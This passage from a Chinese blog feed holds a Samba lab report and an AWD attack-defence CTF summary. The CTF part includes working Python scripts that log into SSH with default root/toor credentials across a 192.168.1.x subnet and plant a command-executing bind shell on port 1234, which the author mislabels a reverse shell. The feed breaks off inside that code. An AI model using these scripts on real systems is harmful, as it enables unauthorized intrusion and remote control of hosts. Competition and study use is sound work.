            "url": "https://blog.xcu.icu/2022/10/24/samba%E5%85%B1%E4%BA%AB/",
            "title": "Samba共享",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"实验2samba服务器配置\"><a class=\"anchor\" href=\"#实验2samba服务器配置\">#</a> 实验 2：Samba 服务器配置</h2>\n<p><strong>实验目的</strong></p>\n<blockquote>\n<p>1、了解 Samba 协议，理解 Samba 的工作原理</p>\n<p>3、熟练掌握 Samba 服务器的配置和故障排除的思路、方法技巧</p>\n<p>4、深入理解 Linux 的文件权限管理</p>\n<p>4、掌握防火墙 Firewall 的基本配置</p>\n<p>5、初步学会配置 SELinux</p>\n</blockquote>\n<p><strong>实验参考</strong></p>\n<blockquote>\n<p>实验步骤可参考《2-1-Samba 服务器配置匿名共享.pdf》文件。</p>\n<p>实验步骤可参考《2-2-Samba 服务器配置_安全共享.pdf》文件。</p>\n</blockquote>\n<h3 id=\"1实验要求\"><a class=\"anchor\" href=\"#1实验要求\">#</a> 1. 实验要求</h3>\n<blockquote>\n<p>任务 1：配置 yum 源，使用光盘镜像或者阿里云的 YUM 源安装 Samba 服务包。<br />\n任务 2：Samba 匿名访问（不需要密码的分享），物理主机匿名访问 Samba 服务器上的共享目录 /tmp 和 /share。</p>\n<p>任务 3：Samba 服务器配置_安全共享。一个小组（公司技术部）共同开发一个项目，所有的项目文件都存放在 Samba 服务器一个共享目录 (/home/project)。要求：</p>\n<ul>\n<li>公司每位成员使用用户名 / 密码访问 Samba 共享服务器，但只有技术部的成员可以访问部门的共享目录 /home/project。</li>\n<li>技术部每位成员在共享目录 /home/project 新建的文件都属于技术部组。</li>\n<li>技术部每位成员都可以对其他用户建立的文件进行读写操作，但每位用户只能删除自己的文件，不能删除其他用户建立的文件。</li>\n</ul>\n<p>其他要求：</p>\n<p>虚拟机主机名为 “Samba-xxx”，其中 xxx 为自己的姓名拼音简写；测试客户端的主机名修改为 “Client-xxx”</p>\n</blockquote>\n<h3 id=\"2实验过程\"><a class=\"anchor\" href=\"#2实验过程\">#</a> 2. 实验过程</h3>\n<h4 id=\"21-yum源配置\"><a class=\"anchor\" href=\"#21-yum源配置\">#</a> 2.1 yum 源配置</h4>\n<p>首先将进入到配置目录，将原有的仓库文件进行一个备份</p>\n<p>先创建一个文件夹来存放备份的文件，如下图 1-1</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjEwMjIyMTEzMDc2MTMucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022211307613.png</span>&quot; alt=&quot;image-20221022211307613&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t图 1-1，建立文件夹</p>\n<p>将文件移动进去后，配置一个阿里的 yum 源，如图 1-2</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjEwMjIyMTI0NDc0ODEucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022212447481.png</span>&quot; alt=&quot;image-20221022212447481&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n<p>​                                                                                 图 1-2，yum 源配置</p>\n<h4 id=\"22-samba匿名共享\"><a class=\"anchor\" href=\"#22-samba匿名共享\">#</a> 2.2 Samba 匿名共享</h4>\n<h5 id=\"221-环境准备\"><a class=\"anchor\" href=\"#221-环境准备\">#</a> 2.2.1 环境准备</h5>\n<p>应老师要求这里不关闭防火墙和 SELinux</p>\n<p>建立一个共享目录 /public，安装 samba 服务程序包如图 2-1</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022213412121.png\" alt=\"image-20221022213412121\" /></p>\n<p>​                                                                                 图 2-1，环境准备</p>\n<h5 id=\"222-修改配置文件etcsambasmbconf\"><a class=\"anchor\" href=\"#222-修改配置文件etcsambasmbconf\">#</a> 2.2.2 修改配置文件 /etc/samba/smb.conf</h5>\n<p>进入 samba 目录，将源文件备份，修改 smb.conf 文件如图 2-2</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214043968.png\" alt=\"image-20221022214043968\" /></p>\n<p>​                                                                    图 2-2，修改配置文件</p>\n<p>修改配置文件内如如下图 2-3</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214220044.png\" alt=\"image-20221022214220044\" /></p>\n<p>​                                                                      图 2-3，配置文件内容</p>\n<h5 id=\"223启动环境\"><a class=\"anchor\" href=\"#223启动环境\">#</a> 2.2.3 启动环境</h5>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">[root@Samba-lq samba]# testparm #语法检查\n[root@Samba-lq samba]# service nmb start #开启nmb服务\n[root@Samba-lq samba]# service smb start #开启smb服务<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p>检查语法如下图 2-4</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214900363.png\" alt=\"image-20221022214900363\" /></p>\n<p>​                                                                          图 2-4，语法测试</p>\n<p>开启 nmb 和 smb 服务如图 2-5</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022214957516.png\" alt=\"image-20221022214957516\" /></p>\n<p>​                                                                          图 2-5，开启服务</p>\n<h5 id=\"224设置防火墙规则和selinux规则\"><a class=\"anchor\" href=\"#224设置防火墙规则和selinux规则\">#</a> 2.2.4 设置防火墙规则和 SELinux 规则</h5>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">[root@Samba-lq samba]# firewall-cmd --permanent --zone&#x3D;public --add-service&#x3D;samba\n[root@Samba-lq samba]# firewall-cmd --reload\n[root@Samba-lq samba]# firewall-cmd --list-services\n[root@Samba-lq samba]# chcon -t samba_share_t &#x2F;public<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>配置如下图 2-5</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221106832.png\" alt=\"image-20221022221106832\" /></p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t图 2-5，配置效果图</p>\n<h5 id=\"225共享目录进入要密码解决\"><a class=\"anchor\" href=\"#225共享目录进入要密码解决\">#</a> 2.2.5 共享目录进入要密码解决</h5>\n<p>问题截图如下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221620593.png\" alt=\"image-20221022221620593\" /></p>\n<p>这里因为我使用的是老师给的配置文件，发现配置文件在 public 的配置中没有 guest ok 允许匿名共享</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221815533.png\" alt=\"image-20221022221815533\" /></p>\n<p>tmp 能够正常访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022221859980.png\" alt=\"image-20221022221859980\" /></p>\n<p>修改后能正常访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222048533.png\" alt=\"image-20221022222048533\" /></p>\n<h5 id=\"226共享目录不能正常写入文件\"><a class=\"anchor\" href=\"#226共享目录不能正常写入文件\">#</a> 2.2.6 共享目录不能正常写入文件</h5>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222139179.png\" alt=\"image-20221022222139179\" /></p>\n<p>这里是因为 public 权限问题，这里更改权限</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222345913.png\" alt=\"image-20221022222345913\" /></p>\n<p>更改后能够正常访问文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022222414216.png\" alt=\"image-20221022222414216\" /></p>\n<h4 id=\"23samba安全共享\"><a class=\"anchor\" href=\"#23samba安全共享\">#</a> 2.3Samba 安全共享</h4>\n<h5 id=\"231环境准备\"><a class=\"anchor\" href=\"#231环境准备\">#</a> 2.3.1 环境准备</h5>\n<p>关闭防火墙和 SELinux</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022230620906.png\" alt=\"image-20221022230620906\" /></p>\n<p>创建共享目录并设置权限</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022230755058.png\" alt=\"image-20221022230755058\" /></p>\n<h5 id=\"232修改配置文件\"><a class=\"anchor\" href=\"#232修改配置文件\">#</a> 2.3.2 修改配置文件</h5>\n<p>进入 /etc/samba 目录修改 smb.conf 文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022231259199.png\" alt=\"image-20221022231259199\" /></p>\n<p>重启服务</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022231355253.png\" alt=\"image-20221022231355253\" /></p>\n<h5 id=\"233创建共享用户根据权限访问\"><a class=\"anchor\" href=\"#233创建共享用户根据权限访问\">#</a> 2.3.3 创建共享用户，根据权限访问</h5>\n<p>创建系统用户</p>\n<p><img data-src=\"C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221022231649122.png\" alt=\"image-20221022231649122\" /></p>\n<p>修改系统用户密码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232021237.png\" alt=\"image-20221022232021237\" /></p>\n<p>创建管理 shamab 用户（使用 pdbedit 管理 Samba）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232202251.png\" alt=\"image-20221022232202251\" /></p>\n<p>查看所有的共享用户</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022232421854.png\" alt=\"image-20221022232421854\" /></p>\n<p>2.3.4windows 客户端利用账户 lisi 访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235143521.png\" alt=\"image-20221022234754805\" /></p>\n<p>创建测试文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235324326.png\" alt=\"image-20221022235324326\" /></p>\n<p>linu 上面用张三登录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235809958.png\" alt=\"image-20221022235809958\" /></p>\n<p>利用账号 zhangsan 挂载目录到本地</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000130466.png\" alt=\"image-20221023000130466\" /></p>\n<p>进入挂载目录创建目录文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000217590.png\" alt=\"image-20221023000217590\" /></p>\n<p>给共享目录设置防删除位</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000438265.png\" alt=\"image-20221023000438265\" /></p>\n<h5 id=\"test-one\"><a class=\"anchor\" href=\"#test-one\">#</a> test-one</h5>\n<p>windows 账号 lisi 删除 zhangsan 创建的文件失败</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000515094.png\" alt=\"image-20221023000515094\" /></p>\n<h5 id=\"test-two\"><a class=\"anchor\" href=\"#test-two\">#</a> test-two</h5>\n<p>zhangsan 删除 lisi 用户文件失败</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000623905.png\" alt=\"image-20221023000623905\" /></p>\n<h3 id=\"3实验小结\"><a class=\"anchor\" href=\"#3实验小结\">#</a> 3. 实验小结</h3>\n",
            "tags": [
                "Linux",
                "Samba"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/",
            "url": "https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/",
            "title": "Awd-web小结",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"查看比赛信息-规则\"><a class=\"anchor\" href=\"#查看比赛信息-规则\">#</a> 查看比赛信息、规则</h2>\n<p>注意赛方的限制比如说提交 flag 的间隔时间，flag 的获取方式，通防的限制，对后门的处理要求等要注意的点，避免 check 丢分</p>\n<h2 id=\"改密码\"><a class=\"anchor\" href=\"#改密码\">#</a> 改密码</h2>\n<p>awd 模式每个队伍会有若干台服务器需要维护，如果主办方平台给的密码较为简单存在弱口令或者可能被爆破成功的机会，尽快修改密码，密码主要是三个方面：</p>\n<ul>\n<li>ssh 连接密码即本地密码</li>\n</ul>\n<p><pre class=\"line-numbers language-ABAP\" data-language=\"ABAP\"><code class=\"language-ABAP\">passwd &#123;用户名&#125;\n做修改即可<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<ul>\n<li>MySQL 登录密码</li>\n</ul>\n<p><pre class=\"line-numbers language-apl\" data-language=\"apl\"><code class=\"language-apl\"><span class=\"token number\">1</span><span class=\"token dyadic-operator operator\">.</span> 使用 SET PASSWORD 命令\n步骤 <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>：输入命令mysql <span class=\"token function\">-</span>u root <span class=\"token function\">-</span>p指定 root 用户登录 MySQL，输入后按回车键输入密码。如果没有配置环境变量，请在 MySQL 的 bin 目录下登录操作。\n\n步骤 <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>：使用 SET PASSWORD 修改密码命令格式为 set password for username <span class=\"token dyadic-operator operator\">@</span>localhost <span class=\"token function\">=</span> password<span class=\"token punctuation\">(</span>newpwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n，其中 username 为要修改密码的用户名，newpwd 为要修改的新密码。\n\n<span class=\"token number\">2</span><span class=\"token dyadic-operator operator\">.</span> 使用mysqladmin修改密码\n使用 mysqladmin 命令修改 MySQL 的 root 用户密码格式为 mysqladmin <span class=\"token function\">-</span>u用户名 <span class=\"token function\">-</span>p旧密码 password 新密码。\n\n注意：修改密码的命令中 <span class=\"token function\">-</span>uroot 和 <span class=\"token function\">-</span>proot 是整体，不要写成 <span class=\"token function\">-</span>u root <span class=\"token function\">-</span>p root，<span class=\"token function\">-</span>u 和 root 间可以加空格，但是会有警告出现，所以就不要加空格了。\n\n<span class=\"token number\">3</span><span class=\"token dyadic-operator operator\">.</span> UPDATE直接编辑user表\n步骤 <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>：输入命令mysql <span class=\"token function\">-</span>u root <span class=\"token function\">-</span>p指定 root 用户登录 MySQL，输入后按回车键输入密码。如果没有配置环境变量，请在 MySQL 的 bin 目录下登录操作。\n\n步骤 <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>：输入use mysql<span class=\"token punctuation\">;</span>命令连接权限数据库。\n\n步骤 <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>：输入命令update mysql<span class=\"token dyadic-operator operator\">.</span>user set authentication_string<span class=\"token function\">=</span>password<span class=\"token punctuation\">(</span><span class=\"token string\">'新密码'</span><span class=\"token punctuation\">)</span> where user<span class=\"token function\">=</span><span class=\"token string\">'用户名'</span> and Host <span class=\"token function\">=</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">;</span>设置新密码。\n\n步骤 <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>：输入 flush privileges<span class=\"token punctuation\">;</span> 命令刷新权限。\n\n步骤 <span class=\"token number\">5</span><span class=\"token punctuation\">)</span>：输入quit<span class=\"token punctuation\">;</span>命令退出 MySQL 重新登录，此时密码已经修改为刚才输入的新密码了。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<ul>\n<li>后台的登录密码</li>\n</ul>\n<p><pre class=\"line-numbers language-ASN.1\" data-language=\"ASN.1\"><code class=\"language-ASN.1\">updata admin set user pass&#x3D;’123456’;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>如果密码是默认的尝试别人的能否登录</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#-*- coding:utf-8 -*-</span>\n<span class=\"token keyword\">import</span> paramiko\n\nip <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.1.137'</span>\nport <span class=\"token operator\">=</span> <span class=\"token string\">'22'</span>\nusername <span class=\"token operator\">=</span> <span class=\"token string\">'root'</span>\npasswd <span class=\"token operator\">=</span> <span class=\"token string\">'toor'</span>\n<span class=\"token comment\"># ssh 用户名 密码 登陆</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">ssh_base_pwd</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token operator\">=</span><span class=\"token string\">'ls'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span>\n    ssh <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>hostname<span class=\"token operator\">=</span>ip<span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span>port<span class=\"token punctuation\">,</span> username<span class=\"token operator\">=</span>username<span class=\"token punctuation\">,</span> password<span class=\"token operator\">=</span>passwd<span class=\"token punctuation\">)</span>\n\n    stdin<span class=\"token punctuation\">,</span>stdout<span class=\"token punctuation\">,</span>stderr <span class=\"token operator\">=</span> ssh<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span>\n\n    result <span class=\"token operator\">=</span> stdout<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> result <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"无结果!\"</span><span class=\"token punctuation\">)</span>\n        result <span class=\"token operator\">=</span> stderr<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ssh<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \na <span class=\"token operator\">=</span> ssh_base_pwd<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>如果可以登录而且有 python 环境可以尝试使用下面这个 python 批量 ssh 登录并反弹 python shell</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#-*- coding:utf-8 -*-</span>\n<span class=\"token keyword\">import</span> paramiko\n<span class=\"token keyword\">import</span> threading\n<span class=\"token keyword\">import</span> queue\n<span class=\"token keyword\">import</span> time\n<span class=\"token comment\">#反弹 shell python</span>\n\nq<span class=\"token operator\">=</span>queue<span class=\"token punctuation\">.</span>Queue<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#lock = threading.Lock()</span>\n\n<span class=\"token comment\"># ssh 用户名 密码 登陆</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">ssh_base_pwd</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span>\n    ssh <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    ssh<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>hostname<span class=\"token operator\">=</span>ip<span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span>port<span class=\"token punctuation\">,</span> username<span class=\"token operator\">=</span>username<span class=\"token punctuation\">,</span> password<span class=\"token operator\">=</span>passwd<span class=\"token punctuation\">)</span>\n\n    stdin<span class=\"token punctuation\">,</span>stdout<span class=\"token punctuation\">,</span>stderr <span class=\"token operator\">=</span> ssh<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span>\n\n    result <span class=\"token operator\">=</span> stdout<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> result <span class=\"token punctuation\">:</span>\n        result <span class=\"token operator\">=</span> stderr<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ssh<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    shell <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''\n    #服务器端\n    import socket\n    import os\n    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\n    s.bind(('0.0.0.0',1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接\n    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量\n    con,addr=s.accept()     #接受一个客户端的连接\n    #print(con,addr)\n\n    for i in range(10):\n        cmd=con.recv(1024)\n        print(cmd)\n        command=cmd.decode()\n        if command.startswith('cd'):\n            os.chdir(command[2:].strip())   #切换路径\n            result=os.getcwd()      #显示路径\n        else:\n            result=os.popen(command).read()\n        if result:\n            con.send(result.encode())\n        else:\n            con.send(b'OK!')\n    '''</span>\n    cmd <span class=\"token operator\">=</span> <span class=\"token string\">'echo \\\"%s\\\" > ./shell.py'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>shell<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">'&amp;&amp; python3 ./shell.py'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'22'</span>\n    username <span class=\"token operator\">=</span> <span class=\"token string\">'root'</span>\n    passwd <span class=\"token operator\">=</span> <span class=\"token string\">'toor'</span>\n    \n    ip <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.1.&#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n    q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>block<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span>\n    ip_demo<span class=\"token operator\">=</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#判断是否成功</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#lock.acquire()</span>\n        res <span class=\"token operator\">=</span> ssh_base_pwd<span class=\"token punctuation\">(</span>ip_demo<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token operator\">=</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ + ]Ip: %s\"</span> <span class=\"token operator\">%</span> ip_demo <span class=\"token operator\">+</span><span class=\"token string\">\" is success!!! [ + ]\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#lock.release()</span>\n            ssh_base_pwd<span class=\"token punctuation\">(</span>ip_demo<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">,</span>cmd<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ - ]Ip: %s\"</span> <span class=\"token operator\">%</span> ip_demo <span class=\"token operator\">+</span><span class=\"token string\">\" is Failed\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> x <span class=\"token operator\">></span> <span class=\"token number\">255</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Finshed!!!!!!!!\"</span><span class=\"token punctuation\">)</span>\n    q<span class=\"token punctuation\">.</span>task_done<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token comment\">#线程队列部分</span>\nth<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nth_num<span class=\"token operator\">=</span><span class=\"token number\">255</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>th_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        t<span class=\"token operator\">=</span>threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>main<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        th<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>th_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        th<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>th_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        th<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        \n\n<span class=\"token comment\">#q.join () 所有任务完成</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code><